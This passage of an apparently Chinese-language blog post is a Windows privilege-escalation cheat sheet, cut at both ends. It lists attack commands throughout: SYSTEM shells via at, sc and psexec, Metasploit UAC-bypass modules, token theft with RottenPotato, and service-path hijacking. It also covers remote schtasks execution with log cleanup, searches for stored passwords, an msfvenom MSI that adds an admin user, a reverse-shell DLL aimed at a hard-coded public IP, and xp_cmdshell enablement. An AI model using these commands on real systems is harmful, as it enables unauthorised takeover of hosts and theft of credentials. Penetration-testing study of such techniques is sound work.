 wmic os get caption 查看系统名  wmic qfe get Description,HotFixID,InstalledOn 查看补丁信息  wmic product get name,version 查看当前安装程序  wmic service list brief 查询本机服务  wmic process list brief 查询本机进程  net share 查看本机共享列表  netsh firewall show config 查看防火墙配置</code></pre><h2 id="常见的杀软如下："><a href="#常见的杀软如下：" class="headerlink" title="常见的杀软如下："></a>常见的杀软如下：</h2><pre><code class="text">360sd.exe 360杀毒  360tray.exe 360实时保护  ZhuDongFangYu.exe 360主动防御  KSafeTray.exe 金山卫士  SafeDogUpdateCenter.exe 安全狗  McAfee McShield.exe McAfee  egui.exe NOD32  AVP.exe 卡巴斯基  avguard.exe 小红伞  bdagent.exe BitDefender</code></pre><h2 id="要搜集的信息大致如下几点："><a href="#要搜集的信息大致如下几点：" class="headerlink" title="要搜集的信息大致如下几点："></a>要搜集的信息大致如下几点：</h2><pre><code class="text">机器的系统及其版本机器的打补丁情况机器安装的服务机器的防火墙策略配置机器的防护软件情况</code></pre><h1 id="提权漏洞"><a href="#提权漏洞" class="headerlink" title="提权漏洞"></a>提权漏洞</h1><h2 id="系统内核溢出漏洞提权"><a href="#系统内核溢出漏洞提权" class="headerlink" title="系统内核溢出漏洞提权"></a>系统内核溢出漏洞提权</h2><h3 id="手工查找补丁情况"><a href="#手工查找补丁情况" class="headerlink" title="手工查找补丁情况"></a>手工查找补丁情况</h3><pre><code class="text">systeminfo  #查看补丁wmic qfe get Description,HotFixID,InstalledOn  #查看补丁信息#Powershell扫描Import-Module C:\Sherlock.ps1Find-AllVulns</code></pre><h3 id="MSF后渗透扫描"><a href="#MSF后渗透扫描" class="headerlink" title="MSF后渗透扫描"></a>MSF后渗透扫描</h3><pre><code class="text">post/windows/gather/enum_patches</code></pre><p>利用（Vulmap、Wes、WindowsVulnScan）对比补丁进而进行提权</p><h2 id="at提权"><a href="#at提权" class="headerlink" title="at提权"></a>at提权</h2><p><strong>在Windows2000、Windows 2003、Windows XP 这三类系统中，我们可以使用at命令将Administrator权限提升至system权限。</strong></p><p>AT命令是Windows XP中内置的命令，它也可以媲美Windows中的”计划任务”，而且在计划的安排、任务的管理、工作事务的处理方面，AT命令具有更强大更神通的功能。AT命令可在指定时间和日期、在指定计算机上运行命令和程序。</p><p>因为at命令默认是以system权限下运行的所以我们可以利用以下命令，进行提权</p><p>at 时间 /interactive cmd 其中里面的/interactive参数是开启交互模式</p><p>设置一个定时任务，到时间后自动弹出一个cmd窗口</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225229034.png" alt="image-20220312225229034"></p><p>此时桌面还是</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225516674.png" alt="image-20220312225516674"></p><p>利用system权限打开任务管理器，结束桌面进程</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225723090.png" alt="image-20220312225723090"></p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225450882.png" alt="image-20220312225450882"></p><p>再重新打开</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225804841.png" alt="image-20220312225804841"></p><p>由此可以实现与msf的联动</p><p>在webshll的cmd中执行  at 时间 /interactive msf的后门程序。(注：这里的权限一定要是Administrator)</p><p>会直接反弹回system权限的会话</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312230306281.png" alt="image-20220312230306281"></p><h2 id="sc提权"><a href="#sc提权" class="headerlink" title="sc提权"></a>sc提权</h2><p><strong>适用于windows 7/8、03/08、12/16</strong></p><p>因为at命令在win7，win8等更高版本的系统上都已经取消掉了，所以在一些更高版本的windows操作系统上我们可以用sc命令进行提权</p><p>SC命令是XP系统中功能强大的DOS命令,SC命令能与”服务控制器”和已安装设备进行通讯。SC是用于与服务控制管理器和服务进行通信的命令行程序。</p><p>也就是说 就是sc可以启动一个服务</p><p>提权命令</p><pre><code class="text">sc Create systemcmd binPath= &quot;cmd /K start&quot; type= own type= interact #设置一个启动cmd窗口的服务sc start systemcmd # 启动该服务创建一个名叫syscmd的cmd服务，我们也可以把binPath换成木马的路径，这样就可以获得一个system权限的会话</code></pre><p>其中systemcmd是服务名称，可以随意填写，binpath是启动的命令，type=own是指服务这个服务属于谁，type=interact。这里再解释一下 cmd/k start 这个命令，这个命令就是启动一个新的cmd窗口</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312231452287.png" alt="image-20220312231452287"></p><h2 id="psexec提权"><a href="#psexec提权" class="headerlink" title="psexec提权"></a>psexec提权</h2><p>**适用版本：Win2003 &amp; Win2008 **</p><p><strong>微软官方工具包</strong>：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><p><strong>提权命令</strong>：</p><pre><code class="text">PsExec.exe /accepteula /s \\127.0.0.1 cmd #直接交互式shellpsexec.exe -accepteula -s -i -d cmd.exe #弹出一个cmd窗口</code></pre><p>开启的cmd窗口也是system权限</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312232849689.png" alt="image-20220312232849689"></p><h2 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h2><h3 id="UAC简介"><a href="#UAC简介" class="headerlink" title="UAC简介"></a><strong>UAC简介</strong></h3><p><strong>1.什么是用户帐户控制(UAC)？</strong></p><p>Microsoft的Windows Vista和Windows Server 2008操作系统引入了一种良好的用户帐户控制架构，以防止系统范围内的意外更改，这种更改是可以预见的，并且只需要很少的操作量。</p><p>换句话说，它是Windows的一个安全功能，它支持防止对操作系统进行未经授权的修改，UAC确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且Windows系统保持不变。</p><p><strong>2.UAC如何运行？</strong></p><p>UAC通过阻止程序执行任何涉及有关系统更改/特定任务的任务来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被”提升权限”，而不是以管理员身份运行的程序。</p><p>一些没有管理员权限无法完成的操作：</p><ul><li>注册表修改（如果注册表项在HKEY_LOCAL_MACHINE下（因为它影响多个用户），它将是只读的）</li><li>加载设备驱动程序</li><li>DLL注入</li><li>修改系统时间（时钟）</li><li>修改用户帐户控制设置（通过注册表，可以启用/禁用该设置，但您需要正确的权限才能执行此操作）</li><li>修改受保护的目录（例如Windows文件夹，Program Files）</li><li>计划任务（例如，以管理员权限自动启动）</li></ul><p><strong>UAC不会自动阻止恶意软件，其目的不是确定程序是否是恶意软件。这同样取决于用户。如果将以管理员权限执行程序，则将提醒用户并且需要用户确认。</strong> </p><p><strong>一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限</strong></p><p>如果不是system权限，我们可以通过以下绕过UAC模块对UAC进行绕过，在通过<strong>getsystem进行提权</strong></p><pre><code class="text">#Msfexploit/windows/local/ask #弹出UAC确认窗口，点击后获得system权限exploit/windows/local/bypassuacexploit/windows/local/bypassuac_injectionexploit/windows/local/bypassuac_fodhelperexploit/windows/local/bypassuac_eventvwrexploit/windows/local/bypassuac_comhijack</code></pre><h3 id="Windows权限升级绕过UAC保护"><a href="#Windows权限升级绕过UAC保护" class="headerlink" title="Windows权限升级绕过UAC保护"></a><strong>Windows权限升级绕过UAC保护</strong></h3><p>此模块将通过进程注入使用可信任发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuacmsf exploit windows/local/bypassuac) &gt; set session 1msf exploit(windows/local/bypassuac) &gt; exploit</code></pre><p>从给定的meterpreter中，您可以看到meterpreter会话2已打开，现在以下命令以确定system权限特权.</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235547978.png" alt="image-20220312235547978"></p><h3 id="Windows权限提升绕过UAC保护（内存注入）"><a href="#Windows权限提升绕过UAC保护（内存注入）" class="headerlink" title="Windows权限提升绕过UAC保护（内存注入）"></a><strong>Windows权限提升绕过UAC保护（内存注入）</strong></h3><p>此模块将通过进程注入使用可信任的发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。在普通技术中，该模块使用反射式DLL注入技术并只除去了DLL payload  二进制文件，而不是三个单独的二进制文件。但是，它需要选择正确的体系架构（对于SYSWOW64系统也使用x64）。如果指定exe::custom，应在单独的进程中启动 payload 后调用ExitProcess（）。</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_injectionmsf exploit(windows/local/bypassuac_injection) &gt; set session 1msf exploit(windows/local/bypassuac_injection) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235641548.png" alt="image-20220312235641548"></p><h3 id="绕过Windows-UAC保护（通过FodHelper注册表项）"><a href="#绕过Windows-UAC保护（通过FodHelper注册表项）" class="headerlink" title="绕过Windows UAC保护（通过FodHelper注册表项）"></a><strong>绕过Windows UAC保护（通过FodHelper注册表项）</strong></h3><p>此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定exe:custom，则应在单独的进程中启动payload后调用ExitProcess（）。</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_fodhelpermsf exploit(windows/local/bypassuac_fodhelper) &gt; set session 1msf exploit(windows/local/bypassuac_fodhelper) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235727956.png" alt="image-20220312235727956"></p><h3 id="Windows权限升级绕过UAC保护（通过Eventvwr注册表项）"><a href="#Windows权限升级绕过UAC保护（通过Eventvwr注册表项）" class="headerlink" title="Windows权限升级绕过UAC保护（通过Eventvwr注册表项）"></a><strong>Windows权限升级绕过UAC保护（通过Eventvwr注册表项）</strong></h3><p>此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定EXE ::Custom，则应在单独的进程中启动payload后调用ExitProcess（）。</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_eventvwrmsf exploit(windows/local/bypassuac_eventvwr) &gt; set session 1msf exploit(windows/local/bypassuac_eventvwr) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235806004.png" alt="image-20220312235806004"></p><h3 id="Windows权限升级绕过UAC保护（通过COM处理程序劫持）"><a href="#Windows权限升级绕过UAC保护（通过COM处理程序劫持）" class="headerlink" title="Windows权限升级绕过UAC保护（通过COM处理程序劫持）"></a><strong>Windows权限升级绕过UAC保护（通过COM处理程序劫持）</strong></h3><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_comhijackmsf exploit(windows/local/bypassuac_comhijack) &gt; set session 1msf exploit(windows/local/bypassuac_comhijack) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235844933.png" alt="image-20220312235844933"></p><h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a><strong>令牌窃取</strong></h2><p><strong>适用于2008之前版本</strong></p><p><strong>令牌简介</strong></p><p>描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该进程没有B用户的权限。一般用户双击运行一个进程都会拷贝explorer.exe的Access Token。访问令牌分为：</p><p>* 授权令牌（Delegation token）：交互式会话登陆（例：本地用户登陆、用户桌面等）</p><p>* 模拟令牌（Impersonation token）：非交互式登陆（例：net use 访问共享文件）</p><p>两种token只有在系统重启后才会清除；授权令牌在用户注销后，该令牌会变为模拟令牌依旧有效。</p><p>同样也可以这样理解，<strong>当前系统中的某个进程或线程能访问到什么样的系统资源,完全取决于你当前进程是拿着谁的令牌。</strong></p><p>默认情况下，我们列举令牌，只能列举出当前用户和比当前用户权限更低用户的令牌。令牌的数量取决于当前shell的访问级别，如果当前的权限是一个普通域用户，所以令牌窃取只能窃取到当前用户本身是。如果当前的shell是administrator或者是system，我们就可以看到系统中的所有的令牌。</p><p><strong>攻击方法</strong></p><p><strong>第一种首先提前获取一个session</strong></p><pre><code class="text">meterpreter &gt; use incognitometerpreter &gt; list_tokens -umeterpreter &gt; impersonate_token WIN-2HU3N1\\Administrator #注意：这里是两个反斜杠\\</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220313002103573.png" alt="image-20220313002103573"></p><p><strong>第二种借用Rotten potato程序</strong></p><p>链接:<a href="https://github.com/foxglovesec/RottenPotato.git">https://github.com/foxglovesec/RottenPotato.git</a></p><pre><code class="text">meterpreter &gt; use incognitometerpreter &gt; list_tokens -uWIN-2HU3N1\Administratormeterpreter &gt; upload /root/Rottenpotato/rottenpotato.exeSuccessfullymeterpreter &gt; execute -HC -f rottenpotato.exeSuccessfullymeterpreter &gt; getuid...NT AUTHORITY\SYSTEM</code></pre><h2 id="烂土豆提权-MS16-075"><a href="#烂土豆提权-MS16-075" class="headerlink" title="烂土豆提权-MS16-075"></a><strong>烂土豆提权-MS16-075</strong></h2><p><strong>一般烂土豆需要来配合令牌窃取来进行提权</strong></p><p><strong>注意（重点：用烂土豆配合本地用户提权是成功不了的，必须是web权限或数据库权限）</strong></p><ol><li>单纯令牌窃取：Web权限或本地权限</li><li>配合烂土豆提权：web权限或数据库等权限</li></ol><p><strong>烂土豆提权原理</strong></p><ol><li>欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。</li><li>对这个认证过程使用中间人攻击（NTLM重放），为”NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</li><li>模仿这个令牌。只有具有”模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</li></ol><p>所以，一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但使用菜刀（IIS服务器权限）反弹meterpreter就会成功。</p><p><strong>攻击方法</strong></p><pre><code class="text">meterpreter &gt; upload /root/Rottenpotato/rottenpotato.exemeterpreter &gt; execute -HC -f rottenpotato.exemeterpreter &gt; use incognitometerpreter &gt; list_tokens -u</code></pre><p>会发现令牌列表里面存在system的令牌，在用system的令牌进行提权</p><p>Juicy Potato的限制条件如下：</p><p>1、需要支持SeImpersonate或者SeAssignPrimaryToken权限<br>2、开启DCOM<br>3、本地支持RPC或者远程服务器支持PRC并能成功登录<br>4、能够找到可用的COM对象</p><p>一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。一般大多数的服务型账户IIS、MSSQL等，有这个权限，大多数用户级的账户没有这个权限，这些都可以whoami /priv 试一下看看有没有模仿权限。</p><p><strong>烂土豆版本</strong></p><p>RottonPatato脚本：</p><ol><li><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe</a></li><li><a href="https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe">https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe</a></li><li><a href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a></li></ol><h2 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a><strong>可信任服务路径漏洞</strong></h2><p><strong>如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的</strong></p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>这里假设有一个服务路径 C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe</p><ol><li>带引号时：”C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe”会被看成一个完整的服务路径，故不会产生漏洞。</li><li>不带引号时：我们认为的服务路径是C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe，但是由于没有双引号的包裹，Windows会认为C:\Program空格后面的为Program这个程序的参数来进行启动服务。这样攻击者就可以命名一个为Program.exe的后门文件放在c盘下，进而等待含漏洞服务路径的启动或重启导致后门文件的执行。</li></ol><h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>寻找存在漏洞的服务</p><pre><code class="text">wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165349775-559246082.png" alt="img"></p><p>把我们后门文件重命名放在对应的文件路径下</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350108-1640161384.png" alt="img"></p><p>  在msf上进行监听，然后启动对应服务</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350469-809846620.png" alt="img"></p><p>接收到shell，且是system权限</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350841-1807683012.png" alt="img"></p><pre><code class="text">#msf检测攻击模块exploit/windows/local/unquoted_service_path#正常接收到会话后，不久就会自动断开连接，需要开启命令自动迁移进程set AutoRunScript migrate -f</code></pre><pre><code class="text">#手动攻击我们需要执行的exe根据需要重命名并放置在可写入的有漏洞目录下然后重启服务sc stop service_namesc start service_name</code></pre><h2 id="不安全服务权限配合计划任务schtasks或SC命令利用"><a href="#不安全服务权限配合计划任务schtasks或SC命令利用" class="headerlink" title="不安全服务权限配合计划任务schtasks或SC命令利用"></a><strong>不安全服务权限配合计划任务schtasks或SC命令利用</strong></h2><p>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用覆盖原来的服务路径，进而启动我们的恶意程序。（一般用来administrator提权到system，因为普通用户用sc修改服务路径会没有权限，导致不能用该方法提权。）</p><p>accesschk.exe -uwcqv “administrators” * #检查administrators组的权限配置（这里自己创建了一个test服务）</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351169-1682951443.png" alt="img"></p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351505-495496718.png" alt="img"></p><p>sc config “test” binpath=”C:\shell.exe” #用sc命令修改服务对应路径</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351871-824825594.png" alt="img"></p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352226-1488097995.png" alt="img"></p><p>sc start test #然后我们在msf监听，在启动该服务，就可以接收到我们的shell</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352599-1121177084.png" alt="img"></p><p>当然还可以用schtasks来定时启动服务，schtasks命令比at命令更灵活。而且在Windows Vista、Windows Server 2008及之后版本的操作系统已经弃用at命令。</p><p>#查看计算机的计划任务<br>schtasks /query /fo LIST /v</p><p>schtasks /create /s 10.10.10.80 /tn test /sc onstart /tr c:\artifact.exe /ru system /f</p><p>在远程主机运行”test”任务</p><p>schtasks /run /s 10.10.10.80 /i /tn “test”</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352923-1541900357.png" alt="img"></p><p> 执行完成之后就删除计划任务</p><p>schtasks /delete /s 10.10.10.80 /tn “test” /f</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353205-57489983.png" alt="img"></p><p> 接着删除IPC$</p><p>net use \10.10.10.80 /del /y</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353471-1410299606.png" alt="img"></p><p> 在使用schtasks命令的时候会在系统留下日志文件C:WindowsTasksSchedLgU.txt。</p><p><strong>参数的意思：</strong></p><p>/create 表示创建计划任务</p><p>/tn 表示任务名</p><p>/tr 指定运行的文件</p><p>/sc 是任务运行频率</p><p>/st 是执行时间</p><p>/s 指定远程机器名或 ip 地址</p><p>/ru 指定运行任务的用户权限，这里指定为最高的 SYSTEM</p><p>/i 表示立即运行</p><p>/F 表示如果指定的任务已经存在，则强制创建任务并抑制警告</p><p>/delete 是删除任务。</p><h2 id="Unattended-Installs（自动安装）"><a href="#Unattended-Installs（自动安装）" class="headerlink" title="Unattended Installs（自动安装）"></a><strong>Unattended Installs（自动安装）</strong></h2><p>自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。 这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。</p><p>全盘搜索Unattend文件是个好办法，它通常会在以下一个文件夹中：</p><pre><code class="text">C:\Windows\Panther\C:\Windows\Panther\Unattend\C:\Windows\System32\C:\Windows\System32\sysprep\</code></pre><p>除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件，这些文件中都会包含部署操作 系统时使用的凭据信息，这些信息可以帮助我们提权。</p><pre><code class="text">C:\Users\user\Desktop&gt; dir C:*vnc.ini /s /b /c</code></pre><p>或者在名称中包含关键词的项目：</p><pre><code class="text">C:\Users\user\Desktop&gt; dir C:\ /s /b /c | findstr /sr *password*</code></pre><p>或者可以在文件内容中搜索password之类的关键字：</p><pre><code class="text">C:\Users\user\Desktop&gt;findstr /si password *.txt | *.xml | *.ini</code></pre><p>可以查询注册表，例如，字符串password：</p><pre><code class="text">reg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /s</code></pre><p>在这些文件中通常包含用户名和密码，密码使用base64编码，并且在最后会附加”Password”，所以真正的密 码需要去掉最后的”Password”。</p><p><strong>msf模块</strong>:</p><pre><code class="text">post/windows/gather/enum_unattend</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353799-254963719.png" alt="img"></p><h2 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a><strong>AlwaysInstallElevated</strong></h2><p>AlwaysInstallElevated 是一种允许非管理用户以SYSTEM权限运行Microsoft Windows安装程序包（.MSI文件）的设置。默认情况下禁用此设置，需系统管理员手动启用他。</p><p>可以通过查询以下注册表项来识别此设置：</p><pre><code class="text">[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer] &quot;AlwaysInstallElevated&quot;=dword:00000001[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] &quot;AlwaysInstallElevated&quot;=dword:00000001</code></pre><p>使用reg query命令查询是否存在漏洞:</p><pre><code class="text">C:&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedorC:&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre><p>如果系统没这个漏洞，它将输出错误:</p><pre><code class="text">ERROR: The system was unable to find the specified registry key or value.</code></pre><p>如果存在漏洞，上面将输出以下内容:</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165354233-1421529420.png" alt="img"></p><p>然后我们使用msfvenom生成msi文件，进行提权</p><pre><code class="text">msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o rotten.msimsiexec /quiet /qn /i C:\programdata\rotten.msi# /quiet 安装过程中禁止向用户发送消息# /qn 不使用GUI# /i 安装程序</code></pre><p>msf下的自动模块<br>exploit/windows/local/always_install_elevated</p><h2 id="DLL劫持提权"><a href="#DLL劫持提权" class="headerlink" title="DLL劫持提权"></a><strong>DLL劫持提权</strong></h2><p><strong>原理</strong>：Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p><p>1、应用程序加载的目录</p><p>2、C:\Windows\System32</p><p>3、C:\Windows\System</p><p>4、C:\Windows</p><p>5、当前工作目录Current Working Directory，CWD</p><p>6、在PATH环境变量的目录（先系统后用户）</p><p>过程：信息收集-进程调试-制作dll并上传-替换dll-启动应用后成功</p><p>msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.169.46 lport=6677 -f dll &gt;/opt/test.dll</p><h2 id="常用系统漏洞CVE"><a href="#常用系统漏洞CVE" class="headerlink" title="常用系统漏洞CVE"></a><strong>常用系统漏洞CVE</strong></h2><p>#Windows10</p><p>CVE-2020-0796 <a href="https://www.cnblogs.com/-chenxs/p/12618678.html">https://www.cnblogs.com/-chenxs/p/12618678.html</a></p><p>#Windows7/2008</p><p>CVE-2018-8120 <a href="https://www.cnblogs.com/-mo-/p/11404598.html">https://www.cnblogs.com/-mo-/p/11404598.html</a></p><p>#Windows7/8、2008/2012/2016</p><p>CVE-2017-0213 <a href="https://www.cnblogs.com/-mo-/p/11446144.html">https://www.cnblogs.com/-mo-/p/11446144.html</a></p><p>#SQL Server、IIS通杀 (针对本地用户的，不能用于域用户)</p><p>MS16-075(RottenPotato) <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075</a></p><h1 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h1><p>先来了解一下怎么才能获取到数据库的账号密码？<br>配置文件中，如：conn、config、data、sql、common 、inc文件中<br>安装目录下，如mysql安装目录下的user.MYD文件<br>使用Bruter工具破解—前提是开启了远程连接<br>使用脚本文件获取</p><p><strong>怎么打开远程连接？</strong><br>root账户一般只能本地访问，但在开发过程中可能需要打开root的远程访问权限。<br>登录到mysql中，为root进行远程访问的授权，执行下面的命令：</p><pre><code>GRANT ALL PRIVILEGES ON *.* TO root@&quot;%&quot; IDENTIFIED BY &quot;root&quot;;flush privileges;</code></pre><p>第一句中”%”表示任何主机都可以远程登录到该服务器上访问。如果要限制只有某台机器可以访问，将其换成相应的IP即可<br>第二句表示从mysql数据库的grant表中重新加载权限数据。因为MySQL把权限都放在了cache中，所以在做完更改后需要重新加载。</p><p><strong>提权</strong>:</p><h2 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h2><h3 id="udf提权："><a href="#udf提权：" class="headerlink" title="udf提权："></a>udf提权：</h3><p>通过创建用户自定义函数，对mysql功能进行扩充，可以执行系统任意命令，将mysql账号root转化为系统system权限。</p><h3 id="mof提权："><a href="#mof提权：" class="headerlink" title="mof提权："></a>mof提权：</h3><p>在windows平台下，c:/windows/system32/wbem/mof/nullevt.mof 这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。<br>启动项提权：将后面脚本上传到系统启动目录，当服务器重启就会自动执行该脚本，从而获取系统权限。</p><h2 id="SQL-Server-提权"><a href="#SQL-Server-提权" class="headerlink" title="SQL Server 提权"></a>SQL Server 提权</h2><p>利用SQL Sercer执行系统命令的方式也有多种，比如xp_cmdshell、SP_OACREATE、沙盒、Agent Job、CLR来提权。</p><h3 id="使用xp-cmdshell进行提权："><a href="#使用xp-cmdshell进行提权：" class="headerlink" title="使用xp_cmdshell进行提权："></a>使用xp_cmdshell进行提权：</h3><pre><code class="text"># 启用xp_cmdshellEXEC master..sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC master..sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;# 通过xp_cmdshell执行系统命令Exec master.dbo.xp_cmdshell &#39;whoami&#39;</code></pre><h3 id="SP-OACREATE"><a href="#SP-OACREATE" class="headerlink" title="SP_OACREATE:"></a>SP_OACREATE:</h3><pre><code class="text"># 开启组件EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;RECONFIGURE WITH OVERRIDE;   EXEC sp_configure &#39;show advanced options&#39;, 0;# 执行系统命令（无回显）declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami&#39;</code></pre><h3 id="通过沙盒执行命令"><a href="#通过沙盒执行命令" class="headerlink" title="通过沙盒执行命令"></a>通过沙盒执行命令</h3><pre><code class="text"># 开启沙盒exec master..xp_regwrite 